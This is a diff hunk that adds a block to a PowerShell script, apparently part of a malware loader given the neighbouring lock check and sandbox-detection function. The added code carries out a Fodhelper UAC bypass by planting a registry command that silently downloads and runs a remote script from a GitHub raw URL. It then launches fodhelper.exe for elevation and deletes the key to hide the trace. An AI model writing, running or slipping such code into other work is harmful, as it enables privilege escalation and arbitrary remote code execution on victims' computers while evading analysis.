@@ -5,6 +5,28 @@ if (Test-Path "$PSScriptRoot\.lock") { return }
 # $ErrorActionPreference = 'SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
+# === UAC BYPASS (Fodhelper) ===
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+    Write-Host "[*] Medium Integrity detected. Attempting Fodhelper UAC Bypass..."
+    $regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
+    $payload = "powershell -NoP -NonI -Exec Bypass -Command `"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/HolyV200/test-repo/main/deploy.ps1?v=uacbypass')`""
+    try {
+        New-Item -Path $regPath -Force -EA 0 | Out-Null
+        New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force -EA 0 | Out-Null
+        Set-ItemProperty -Path $regPath -Name "(default)" -Value $payload -Force -EA 0 | Out-Null
+        Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden -EA 0
+        Start-Sleep -Seconds 3
+        Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -EA 0 | Out-Null
+        Write-Host "[+] Elevated payload launched. Exiting standard shell."
+        Exit
+    } catch {
+        Write-Host "[!] UAC Bypass failed. Proceeding with standard privileges."
+    }
+} else {
+    Write-Host "[+] Running as High Integrity Administrator."
+}
+
 # === ANTI-ANALYSIS ===
 function Test-Sandbox {
     $hits = 0
